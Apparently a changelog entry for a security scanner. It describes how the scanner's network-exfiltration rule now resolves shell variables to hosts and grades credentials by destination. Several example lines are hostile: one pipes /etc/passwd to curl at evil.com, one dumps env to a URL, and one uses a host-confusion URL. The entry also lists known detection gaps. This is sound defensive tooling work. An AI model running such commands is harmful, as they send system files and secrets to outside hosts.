### Fixed — `--scan-skills` net-exfil follows a `$VAR` to its host and grades a credential by where it goes (#353, thanks @toasterbook88)

@toasterbook88 scanned a 2,077-file skills tree and read every one of the 107 `EXFILTRATE:net-exfil` rows by hand. They found that the rule fired per line on a network verb plus any `$VAR`, so `BASE_URL=https://api.cloudflare.com/…` three lines up was invisible, and documented API calls read like exfiltration. They then froze a classifier (`classify107.sh`) and published a corrected histogram: about 89 of the 107 were documented service-API calls, and the six that carried a credential all sent it to the service that owns it. They also found the miss the rule is named for: `cat /etc/passwd | curl https://evil.com --data-binary @-` scanned clean. The 0.6.x severity fix made that read CRITICAL. This entry adds the flow-based part promised then.

- **Same-document `$VAR` resolution.** A `$VAR` or `${VAR}` on a flagged line stands for a literal only when the same file binds `VAR` at exactly one site, before the line. That site must be a plain `VAR=…` or `export VAR=…`, or a `for VAR in` list of literal words. Every other binding counts as a site and leaves the variable unresolved: a second assignment, an assignment after the line, `VAR=$(cmd)`, `VAR=$OTHER`, an assignment inside a pipeline, and `read`, `local`, `unset`, `${VAR:=…}` and `printf -v`. A variable later in the URL path (`…/accounts/$ID`) does not hide the host.
- **`dest=`** on a net-exfil row lists the hosts the line's `curl` commands send to, but only when every host is proved. A proved host is a literal URL or a resolved `$VAR`. If the line has an unresolved `$VAR`, a proxy (`-x`), `--resolve`, a config file (`-K`), an option the proof does not model, a second network verb (an `eval`'d string, a `wget`), a `$(…)`, a trailing `\` or a non-digit port, the row has no `dest=`. The host is whatever follows the authority's one `@`, so `https://api.github.com@evil.example/` goes to evil.example.
- **`why="local-dest"`.** A credential variable sent only to localhost, 127/8, ::1, RFC 1918 or link-local hosts is WARN, not CRITICAL. A request to your own machine is not exfiltration. A leading-zero octet (`010.0.0.1`, which curl reads as octal) is not called private.
- **`why="cred-to-owner"`.** A credential variable whose name names the owner of every destination is WARN. That covers `CLOUDFLARE`/`CF` to cloudflare.com, `GITHUB`/`GH` to github.com and `AIRTABLE` to airtable.com. The table is small and explicit, and a compile-time check requires each owner's domain to be its stem plus `.com`. Under `.com` the registrable domain is the last two labels, so the match is label equality, not substring: cloudflare.evil.example, evilcloudflare.com and pages.github.io stay CRITICAL. Every credential variable on the line must name that owner, and every `$` in an Authorization header must be a credential-named variable.

When the proof is unsure, the row stays CRITICAL. Only a credential *variable* can be downgraded. An env dump, a key file and a credential-file read stay CRITICAL wherever they go, and `sensitive-read-upload` is CRITICAL whatever the host. On a synthetic tree shaped like the reporter's corrected histogram, CRITICAL went from 6 rows to 0: all six credential rows sent their credential to its owner and became WARN `cred-to-owner`. No other row changed grade, and 81 of the 107 rows now name their host. In the 25-line negative set (`test/skillfix/netexfil_flow.md` block B), no row moved from CRITICAL to WARN. Each negative arm has a source mutant that turns it red.

The approach takes two ideas from NVIDIA SkillSpector's taint tracking (Apache-2.0): follow a value through an intermediate variable, and keep the finding whenever an operand, flag or command lies outside what the proof models. No SkillSpector code or pattern text is included. The `--scan-skills` categories already credit NVIDIA's skill-scanning work.

Known limits, unchanged: the proof models `curl` only, so a `wget` or `nc` line keeps its line-local grade. A command continued with `\` is read one line at a time, so a credential on the continuation line is not seen. `env | curl --data-binary @- URL`, with no `$VAR` or `base64`, still scans clean. Gates: `test/skillscan.sh` check 18b, `test/regexguardcheck.sh` arm (f4) (bounded time on 50,000 assignments, 40,000 destination words and a 3,000-fold expansion).
